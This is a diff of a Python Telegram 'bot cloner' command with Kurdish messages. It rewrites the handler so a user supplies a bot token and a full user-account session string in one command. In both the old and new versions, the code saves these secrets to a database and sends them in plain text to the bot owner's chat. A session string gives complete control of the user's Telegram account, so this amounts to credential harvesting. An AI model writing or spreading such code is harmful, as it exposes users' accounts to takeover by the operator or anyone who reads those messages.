@@ -421,146 +421,74 @@ async def codev2(client, message):
     )
 
 
-from pyrogram import Client, filters
-from pyrogram.types import ChatPrivileges, InlineKeyboardButton, InlineKeyboardMarkup
-
-user_steps = {}  # Dictionary to track user steps in the process
-
-
 @app.on_message(filters.command(["دروستکردنی بۆت", "• دروستکردنی بۆت •"], ""))
-async def cloner(app: Client, message):
+async def cloner(app, message):
     if await is_block_user(message.from_user.id):
         return
-    if OFF:
-        if message.chat.username not in OWNER:
-            return await message.reply_text(
-                f"**👋🏻 ꒐ بۆت ناچالاککراوە \n👾 ꒐ نامە بۆ گەشەپێدەر بنێرە\n🧑🏻‍💻 ꒐ گەشەپێدەر : @{OWNER[0]}**",
-                reply_markup=InlineKeyboardMarkup(
-                    [
-                        [
-                            InlineKeyboardButton(
-                                "˼  گەشەپێدەر  🧑🏻‍💻 ˹", url=f"https://t.me/{OWNER[0]}"
-                            )
-                        ]
-                    ]
-                ),
+    if OFF and message.chat.username not in OWNER:
+        return await message.reply_text(
+            f"**👋🏻 ꒐ بۆت ناچالاککراوە \n👾 ꒐ نامە بۆ گەشەپێدەر بنێرە\n🧑🏻‍💻 ꒐ گەشەپێدەر : @{OWNER[0]}**",
+            reply_markup=InlineKeyboardMarkup(
+                [[InlineKeyboardButton("˼  گەشەپێدەر  🧑🏻‍💻 ˹", url=f"https://t.me/{OWNER[0]}")]]
             )
-    user_steps[message.from_user.id] = "awaiting_token"
-    await message.reply_text("**◗⋮◖ تۆکنی بۆت بنێرە 💎.**")
+        )
+    
+    # Extracting arguments from the command
+    args = message.text.split()
+    if len(args) < 3:  # Check if both token and session are provided
+        return await message.reply_text("**◗⋮◖ تکایە تۆکن و کۆدی یاریدەدەر بنێرە بە شێوەی : `دروستکردنی بۆت token session`**")
+    
+    token = args[1]
+    session = args[2]
 
+    try:
+        # Bot token validation
+        await message.reply_text("**◗⋮◖ پشکنین بۆ تۆکنەکە دەکرێت ..⚡.**")
+        bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
+        await bot.start()
+    except Exception:
+        return await message.reply_text("**◗⋮◖ تۆکنی بۆت هەڵەیە 💎.**")
+    
+    bot_info = await bot.get_me()
+    if await is_served_bot(bot_info.username) or bot_info.username in Done:
+        await bot.stop()
+        return await message.reply_text("**◗⋮◖ ناتوانی بۆت دروست بکەیت ⚡.**")
 
-@app.on_message(filters.reply & filters.user(user_steps.keys()))
-async def handle_user_input(client: Client, message):
-    user_id = message.from_user.id
-    step = user_steps.get(user_id)
+    user_client = Client("ALINA", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
+    try:
+        await user_client.start()
+    except:
+        await bot.stop()
+        return await message.reply_text("**◗⋮◖ کۆد هەڵەیە ⚡.**")
+    
+    # Creating group and setting up permissions
+    group = await user_client.create_supergroup("گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات")
+    if bot_info.photo:
+        photo = await bot.download_media(bot_info.photo.big_file_id)
+        await user_client.set_chat_photo(group.id, photo=photo)
+    
+    await user_client.add_chat_members(group.id, bot_info.username)
+    await user_client.promote_chat_member(
+        group.id, bot_info.username,
+        privileges=ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True,
+                                  can_restrict_members=True, can_pin_messages=True, can_promote_members=True,
+                                  can_manage_chat=True, can_manage_video_chats=True)
+    )
+    group_link = await user_client.export_chat_invite_link(group.id)
+    await user_client.stop()
+    await bot.stop()
 
-    if step == "awaiting_token":
-        token = message.text
-        try:
-            await message.reply_text("**◗⋮◖ پشکنین بۆ تۆکنەکە دەکرێت ..⚡.**")
-            bot = Client(
-                "Cloner",
-                api_id=API_ID,
-                api_hash=API_HASH,
-                bot_token=token,
-                in_memory=True,
-            )
-            await bot.start()
-            bot_i = await bot.get_me()
-            bot_username = bot_i.username
-
-            # Check if bot is already served
-            if await is_served_bot(bot_username) or bot_username in Done:
-                await bot.stop()
-                return await message.reply_text("**◗⋮◖ ناتوانی بۆت دروست بکەیت ⚡.**")
-
-            # Move to next step
-            user_steps[user_id] = {
-                "step": "awaiting_session",
-                "bot": bot,
-                "bot_username": bot_username,
-                "token": token,
-            }
-            await message.reply_text("**◗⋮◖ ئێستا کۆدی یاریدەدەر بنێرە 💎.**")
-        except Exception as e:
-            await message.reply_text(f"**◗⋮◖ تۆکنی بۆت هەڵەیە 💎.**\n{str(e)}")
-            del user_steps[user_id]
-
-    elif step == "awaiting_session":
-        session = message.text
-        bot_data = user_steps[user_id]
-        bot = bot_data["bot"]
-        bot_username = bot_data["bot_username"]
-        token = bot_data["token"]
-
-        try:
-            await message.reply_text("**◗⋮◖ بۆت چالاک دەکرێت کەمێك چاوەڕێ بکە ..⚡.**")
-            user = Client(
-                "ALINA",
-                api_id=API_ID,
-                api_hash=API_HASH,
-                session_string=session,
-                in_memory=True,
-            )
-            await user.start()
-
-            # Create bot's log group and set up details
-            loger = await user.create_supergroup(
-                "گرووپی بۆت 🖤", "ئەم گرووپە هەموو ئامار و زانیاریەکانی بۆت سەیڤ دەکات"
-            )
-            if bot.photo:
-                photo = await bot.download_media(bot.photo.big_file_id)
-                await user.set_chat_photo(chat_id=loger.id, photo=photo)
-            await user.add_chat_members(loger.id, bot_username)
-            await user.promote_chat_member(
-                loger.id,
-                bot_username,
-                privileges=ChatPrivileges(
-                    can_change_info=True,
-                    can_invite_users=True,
-                    can_delete_messages=True,
-                    can_restrict_members=True,
-                    can_pin_messages=True,
-                    can_promote_members=True,
-                    can_manage_chat=True,
-                    can_manage_video_chats=True,
-                ),
-            )
-            loggerlink = await user.export_chat_invite_link(loger.id)
-
-            # Save bot data
-            dev = message.chat.id
-            data = {
-                "bot_username": bot_username,
-                "token": token,
-                "session": session,
-                "dev": dev,
-                "logger": loger.id,
-                "logger_mode": "ON",
-            }
-            Bots.insert_one(data)
-
-            # Notify user and owner
-            await message.reply_text(
-                f"**◗⋮◖ بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\n◗⋮◖ گرووپی ئامار دروست کرا 🚦⚡.\n"
-                f"◗⋮◖ ئێستا دەتوانی بۆتی گۆرانی بەکاربھێنیت 🚦⚡.\n⟨ [{loggerlink}] ⟩**",
-                disable_web_page_preview=True,
-            )
-            await app.send_message(
-                OWNER[0],
-                f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : `{token}` 🚦⚡.\n"
-                f"◗⋮◖ کۆدی یاریدەدەر : `{session}` 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n"
-                f"◗⋮◖ ئایدی : {dev} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {loggerlink} 🚦⚡.**",
-            )
-
-            # Cleanup
-            await bot.stop()
-            await user.stop()
-            del user_steps[user_id]
-
-        except Exception as e:
-            await message.reply_text(f"**◗⋮◖ کۆد یاریدەدەر هەڵەیە ⚡.**\n{str(e)}")
-            del user_steps[user_id]
+    # Logging the created bot
+    dev_id = message.chat.id if message.chat.username not in OWNER else OWNER[0]
+    Bots.insert_one({"bot_username": bot_info.username, "token": token, "session": session, "dev": dev_id, "logger": group.id, "logger_mode": "ON"})
+    
+    await message.reply_text(
+        f"**◗⋮◖ بە سەرکەوتوویی بۆتی گۆرانی دروستکرا 🚦⚡.\n◗⋮◖ گرووپی ئامار دروست کرا 🚦⚡.\n⟨ [{group_link}] ⟩**",
+        disable_web_page_preview=True
+    )
+    await app.send_message(
+        OWNER[0], f"**◗⋮◖ بۆتی نوێ 🚦⚡.\n◗⋮◖ یوزەری بۆت : @{bot_info.username} 🚦⚡.\n◗⋮◖ تۆکنی بۆت : {token} 🚦⚡.\n◗⋮◖ کۆدی یاریدەدەر : {session} 🚦⚡.\n◗⋮◖ لەلایەن : {message.from_user.mention} 🚦⚡.\n◗⋮◖ ئایدی : {message.chat.id} 🚦⚡.\n◗⋮◖ گرووپی ئامار : {group_link} 🚦⚡.**",
+    )
 
 
 @app.on_message(filters.command(["سڕینەوەی بۆت", "• سڕینەوەی بۆت •"], ""))
